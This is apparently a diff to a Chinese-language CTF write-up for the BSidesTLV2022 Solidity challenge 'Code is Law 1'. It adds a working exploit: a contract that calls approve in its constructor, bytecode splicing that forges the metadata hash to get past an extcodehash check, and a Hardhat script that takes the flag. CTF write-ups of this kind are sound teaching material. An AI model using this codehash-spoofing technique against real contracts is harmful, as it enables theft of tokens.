@@ -204,6 +204,78 @@ Download the **zip** file and follow the instructions in the **README.md** file 
     - `_balances` 为 `mapping` 类型，占用 `slot 0`，那么地址 `A` 的余额存储位置在 `keccak256(A | 0)`，`|` 表示连接
 
 - `Code is Law 2` 与 `Code is Law 1` 相比，只修改了 `ChallengeToken` 发放 `token` 的规则并禁用了 `approve`，因而修改存储的方法仍然适用 =）
+- 看了官方 WP[^2] 再来补充一下 =ω=
+
+### Code is Law 1
+
+- 关键点在于构造函数不是合约代码的一部分，因此可以在 `OnlyICanHazToken` 的构造函数中 `approve`
+- 扩展合约 `OnlyICanHazToken`
+
+    ```js
+    //SPDX-License-Identifier: Unlicense
+    pragma solidity ^0.8.0;
+
+    import "./ChallengeToken.sol";
+
+    contract ExtOnlyICanHazToken {
+        constructor() {
+            ChallengeToken(0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f).approve(msg.sender, 1);
+        }
+
+        function bye() public {
+            selfdestruct(payable(msg.sender));
+        }
+    }
+    ```
+
+- 不过，直接使用合约 `ExtOnlyICanHazToken` 仍然会得到报错 `receiver is ineligible for a token because their codehash does not match the specific contract codehash required` :(
+- 打印合约 `OnlyICanHazToken` 和 `ExtOnlyICanHazToken` 的字节码进行对比
+
+    ```js
+    console.log((await ethers.getContractFactory("OnlyICanHazToken")).bytecode);
+    // 0x6080604052348015600f57600080fd5b5060848061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212208288fb767ec1f00b6068ee0de53f59961ced5ec5d3e1770e0a0a46ede725d1ff64736f6c63430008040033
+    console.log((await ethers.getContractFactory("ExtOnlyICanHazToken")).bytecode);
+    // 0x608060405234801561001057600080fd5b507373511669fd4de447fed18bb79bafeac93ab7f31f73ffffffffffffffffffffffffffffffffffffffff1663095ea7b33360016040518363ffffffff1660e01b8152600401610061929190610115565b602060405180830381600087803b15801561007b57600080fd5b505af115801561008f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100b391906100ce565b506101af565b6000815190506100c881610198565b92915050565b6000602082840312156100e057600080fd5b60006100ee848285016100b9565b91505092915050565b6101008161013e565b82525050565b61010f81610186565b82525050565b600060408201905061012a60008301856100f7565b6101376020830184610106565b9392505050565b60006101498261015c565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006101918261017c565b9050919050565b6101a181610150565b81146101ac57600080fd5b50565b6084806101bd6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220497d6dee22cd21fcfafd049f00aefcfe7425aa5efdc817d1afe4473a9e7ceb2964736f6c63430008040033
+    ```
+
+- 字节码 `39` 将合约代码拷贝到内存中，所以比较两份合约代码最后一个 `39` 后的字节码，发现有一小段差异
+
+    ```
+    6000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220_8288fb767ec1f00b6068ee0de53f59961ced5ec5d3e1770e0a0a46ede725d1ff_64736f6c63430008040033
+    6000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220_497d6dee22cd21fcfafd049f00aefcfe7425aa5efdc817d1afe4473a9e7ceb29_64736f6c63430008040033
+    ```
+
+- 编译器默认会将 `metadata` 文件的 IPFS 哈希添加到字节码的末尾[^4]，`v0.8.0` 版本的编译器通常按如下格式添加
+
+    ```
+    0xa2
+    0x64 'ipfs'(69706673) 0x58 0x22 <34 bytes IPFS hash>
+    0x64 'solc'(736f6c63) 0x43 <3 byte version encoding>
+    0x00 0x33
+    ```
+
+- 为了通过 `extcodehash` 的检查，可以使用 `OnlyICanHazToken` 覆盖 `ExtOnlyICanHazToken` IPFS 哈希部分的字节码
+
+    ```js
+    it("Should return the winning flag", async function () {
+        let onlyICanHazTokenFactory = await ethers.getContractFactory('OnlyICanHazToken');
+        let extOnlyICanHazTokenFactory = await ethers.getContractFactory('ExtOnlyICanHazToken');
+
+        let [player] = await ethers.getSigners();
+        const ExtOnlyICanHazTokenFactory = new ethers.ContractFactory(onlyICanHazTokenFactory.interface, extOnlyICanHazTokenFactory.bytecode.substring(0, extOnlyICanHazTokenFactory.bytecode.length - 100) + onlyICanHazTokenFactory.bytecode.substring(onlyICanHazTokenFactory.bytecode.length - 100), player);
+        let extOnlyICanHazToken = await ExtOnlyICanHazTokenFactory.deploy();
+        await extOnlyICanHazToken.deployed();
+
+        challengeToken = await ethers.getContractAt("ChallengeToken", "0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f");
+
+        await challengeToken.can_i_haz_token(extOnlyICanHazToken.address);
+        await challengeToken.transferFrom(extOnlyICanHazToken.address, player.address, 1);
+
+        const returnedFlag = await challengeToken.did_i_win()
+
+        console.log(`\tThe returned flag is: "${returnedFlag}"`)
+    });
+    ```
 
 ### Flag
 
@@ -215,4 +287,14 @@ Download the **zip** file and follow the instructions in the **README.md** file 
 
 > BSidesTLV2022{W!L3_M@g!3_in_the_w3rld}
 
+## 参考资料
+
+- [ContractFactory | ethers](https://docs.ethers.io/v5/single-page/#/v5/api/contract/contract-factory/)
+
 [^1]: [Local ERC20 Balance Manipulation (with HardHat)](https://kndrck.co/posts/local_erc20_bal_mani_w_hh/)
+
+[^2]: [Code is Law 1: Solidity CTF Challenge Writeup | by Oren Yomtov](https://medium.com/@patternrecognizer/solidity-ctf-writeup-code-is-law-1-465428bf4bd5)
+
+[^3]: [Code is Law 2: Solidity CTF Challenge Writeup | by Oren Yomtov](https://medium.com/@patternrecognizer/code-is-law-2-solidity-ctf-challenge-writeup-c55f072664a9)
+
+[^4]: [Contract Metadata](https://docs.soliditylang.org/en/v0.8.15/metadata.html)
